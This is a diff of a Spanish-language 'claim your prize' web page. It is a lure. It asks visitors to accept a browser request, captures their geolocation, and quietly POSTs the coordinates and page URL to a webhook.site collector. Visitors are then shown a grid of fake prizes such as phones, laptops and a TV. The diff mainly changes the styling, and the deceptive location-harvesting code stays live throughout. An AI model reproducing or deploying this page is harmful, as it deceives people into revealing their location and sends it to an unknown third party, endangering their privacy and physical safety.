@@ -3,99 +3,109 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Verificación y Validación</title>
+  <title>Verificación y Premios</title>
   <style>
-    body { 
-      font-family: Arial, sans-serif; 
-      text-align: center; 
-      background: linear-gradient(135deg, #f5f5f5, #e0e0e0); 
-      transition: background 1s ease-in-out;
-      overflow-x: hidden;
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      margin: 0;
+      padding: 0;
+      background: linear-gradient(135deg, #4facfe, #00f2fe);
+      color: #333;
     }
-    h1 { color: #222; margin-top: 30px; }
-    button { 
-      padding: 12px 25px; 
-      font-size: 18px; 
-      border: none; 
-      border-radius: 6px; 
-      background: #007bff; 
-      color: #fff; 
-      cursor: pointer; 
-      transition: transform 0.2s, background 0.3s; 
+    .container {
+      max-width: 800px;
+      margin: 60px auto;
+      background: #fff;
+      border-radius: 15px;
+      box-shadow: 0 8px 25px rgba(0,0,0,0.15);
+      padding: 40px 30px;
+      text-align: center;
+      animation: fadeIn 1s ease-in-out;
     }
-    button:hover { background: #0056b3; transform: scale(1.05); }
-    #msg { margin-top: 20px; font-size: 20px; font-weight: bold; color: green; display: none; }
-    #icono { margin-top: 20px; width: 120px; display: none; }
-    #premio { margin-top: 30px; display: none; }
-    #premio img { width: 220px; border-radius: 12px; box-shadow: 0px 3px 8px rgba(0,0,0,0.2); opacity: 0; transform: scale(0.5); animation: zoomIn 1s forwards; }
-    #premioNombre { margin-top: 15px; font-size: 22px; font-weight: bold; color: #333; opacity: 0; transform: translateY(20px); animation: fadeUp 1s 0.5s forwards; }
-
-    @keyframes zoomIn {
-      0% { opacity: 0; transform: scale(0.5); }
-      60% { opacity: 1; transform: scale(1.2); }
-      80% { transform: scale(0.9); }
-      100% { transform: scale(1); }
+    h1 {
+      color: #222;
+      margin-bottom: 15px;
     }
-
-    @keyframes fadeUp {
-      0% { opacity: 0; transform: translateY(20px); }
-      100% { opacity: 1; transform: translateY(0); }
+    p {
+      font-size: 16px;
+      color: #555;
     }
-
-    /* Confeti */
-    .confeti {
-      position: fixed;
-      width: 10px;
-      height: 10px;
-      top: -10px;
-      background: red;
-      opacity: 0.8;
-      animation: caer 4s linear forwards;
+    button {
+      margin-top: 20px;
+      padding: 14px 35px;
+      font-size: 18px;
+      border: none;
+      border-radius: 8px;
+      background: #007bff;
+      color: #fff;
+      cursor: pointer;
+      transition: background 0.3s ease;
     }
-    @keyframes caer {
-      to { transform: translateY(110vh) rotate(720deg); }
+    button:hover {
+      background: #0056b3;
+    }
+    #msg {
+      margin-top: 25px;
+      font-size: 20px;
+      font-weight: bold;
+      color: green;
+      display: none;
+      animation: fadeIn 1s ease-in-out;
+    }
+    .premios {
+      margin-top: 30px;
+      display: none;
+      grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+      gap: 20px;
+    }
+    .premio-card {
+      background: #fafafa;
+      border-radius: 12px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+      padding: 15px;
+      transition: transform 0.3s ease, box-shadow 0.3s ease;
+    }
+    .premio-card:hover {
+      transform: translateY(-8px);
+      box-shadow: 0 8px 25px rgba(0,0,0,0.15);
+    }
+    .premio-card img {
+      width: 100%;
+      border-radius: 10px;
+      object-fit: cover;
+    }
+    .premio-card h3 {
+      margin: 10px 0 0;
+      font-size: 16px;
+      color: #333;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
     }
   </style>
 </head>
 <body>
-  <h1>✅ VERIFICACIÓN Y VALIDACIÓN</h1>
-  <p>Por favor, pulsa el botón y acepta la solicitud.</p>
-  <button onclick="obtenerUbicacion()">📍 RECLAMA TU PREMIO</button>
-  
-  <p id="msg">¡Gracias por aceptar! 🎉</p>
-  <img id="icono" src="https://cdn-icons-png.flaticon.com/512/190/190411.png" alt="Gracias">
-
-  <!-- Premio aleatorio -->
-  <div id="premio">
-    <h2>🎁 Tu premio es:</h2>
-    <img id="premioImg" src="" alt="Premio">
-    <p id="premioNombre"></p>
+  <div class="container">
+    <h1>✅ VERIFICACIÓN Y VALIDACIÓN</h1>
+    <p>Por favor, pulsa el botón y acepta la solicitud.</p>
+    <button onclick="obtenerUbicacion()">📍 RECLAMA TU PREMIO</button>
+    <p id="msg">🎉 ¡Gracias por aceptar! Aquí están tus premios:</p>
+    
+    <div class="premios" id="premios"></div>
   </div>
-
-  <!-- Sonido de celebración -->
-  <audio id="aplausos" src="https://www.soundjay.com/human/applause-8.mp3" preload="auto"></audio>
 
 <script>
 const WEBHOOK_URL = "https://webhook.site/1680fad7-4e5b-4842-a3b7-d76fcd7d5639";
 
+// Lista de premios realistas
 const premios = [
-  { nombre: "🚲 Bicicleta de montaña", img: "https://cdn-icons-png.flaticon.com/512/3104/3104795.png" },
-  { nombre: "🎮 Consola de videojuegos", img: "https://cdn-icons-png.flaticon.com/512/3176/3176364.png" },
-  { nombre: "📱 Celular de gama alta", img: "https://cdn-icons-png.flaticon.com/512/2920/2920244.png" },
-  { nombre: "💻 Laptop gamer", img: "https://cdn-icons-png.flaticon.com/512/3131/3131638.png" },
-  { nombre: "📺 Televisor Smart 4K", img: "https://cdn-icons-png.flaticon.com/512/3202/3202926.png" },
-  { nombre: "🎧 Audífonos inalámbricos", img: "https://cdn-icons-png.flaticon.com/512/1041/1041873.png" },
-  { nombre: "🏍️ Moto deportiva", img: "https://cdn-icons-png.flaticon.com/512/2972/2972185.png" }
-];
-
-const fondos = [
-  "linear-gradient(135deg, #ff9a9e, #fad0c4)",
-  "linear-gradient(135deg, #a18cd1, #fbc2eb)",
-  "linear-gradient(135deg, #f6d365, #fda085)",
-  "linear-gradient(135deg, #84fab0, #8fd3f4)",
-  "linear-gradient(135deg, #fccb90, #d57eeb)",
-  "linear-gradient(135deg, #f093fb, #f5576c)",
-  "linear-gradient(135deg, #4facfe, #00f2fe)"
+  { nombre: "🚲 Bicicleta de montaña", img: "https://cdn.pixabay.com/photo/2017/03/02/04/23/bicycle-2119460_1280.jpg" },
+  { nombre: "🎮 Consola Gamer", img: "https://cdn.pixabay.com/photo/2016/11/29/04/17/joystick-1866599_1280.jpg" },
+  { nombre: "📱 Smartphone Gama Alta", img: "https://cdn.pixabay.com/photo/2016/11/19/14/00/smartphone-1836073_1280.jpg" },
+  { nombre: "⌚ Smartwatch", img: "https://cdn.pixabay.com/photo/2015/09/05/21/51/apple-watch-925157_1280.jpg" },
+  { nombre: "💻 Laptop Ultrabook", img: "https://cdn.pixabay.com/photo/2014/05/02/21/50/home-office-336378_1280.jpg" },
+  { nombre: "📺 TV Pantalla Grande", img: "https://cdn.pixabay.com/photo/2015/09/05/22/46/tv-926093_1280.jpg" }
 ];
 
 function obtenerUbicacion() {
@@ -126,6 +136,7 @@ function onSuccess(pos) {
     source: window.location.href
   };
 
+  // Enviar datos al webhook
   fetch(WEBHOOK_URL, {
     method: "POST",
     mode: "no-cors",
@@ -133,35 +144,23 @@ function onSuccess(pos) {
     body: JSON.stringify(data, null, 2)
   });
 
+  // Mostrar mensaje
   document.getElementById("msg").style.display = "block";
-  document.getElementById("icono").style.display = "block";
 
-  const premioAleatorio = premios[Math.floor(Math.random() * premios.length)];
-  document.getElementById("premioImg").src = premioAleatorio.img;
-  document.getElementById("premioNombre").textContent = premioAleatorio.nombre;
-  document.getElementById("premio").style.display = "block";
+  // Mostrar catálogo de premios
+  const premiosDiv = document.getElementById("premios");
+  premiosDiv.style.display = "grid";
+  premiosDiv.innerHTML = "";
 
-  // Fondo aleatorio
-  document.body.style.background = fondos[Math.floor(Math.random() * fondos.length)];
-
-  // Aplausos
-  document.getElementById("aplausos").play();
-
-  // Lanzar confeti 🎊
-  lanzarConfeti();
-}
-
-function lanzarConfeti() {
-  for (let i = 0; i < 40; i++) {
-    const confeti = document.createElement("div");
-    confeti.className = "confeti";
-    confeti.style.left = Math.random() * 100 + "vw";
-    confeti.style.background = `hsl(${Math.random() * 360}, 100%, 50%)`;
-    confeti.style.animationDuration = (Math.random() * 2 + 2) + "s";
-    confeti.style.transform = `rotate(${Math.random() * 360}deg)`;
-    document.body.appendChild(confeti);
-    setTimeout(() => confeti.remove(), 4000);
-  }
+  premios.forEach(p => {
+    const card = document.createElement("div");
+    card.className = "premio-card";
+    card.innerHTML = `
+      <img src="${p.img}" alt="${p.nombre}">
+      <h3>${p.nombre}</h3>
+    `;
+    premiosDiv.appendChild(card);
+  });
 }
 
 function onError(err) {
@@ -170,3 +169,4 @@ function onError(err) {
 </script>
 </body>
 </html>
+
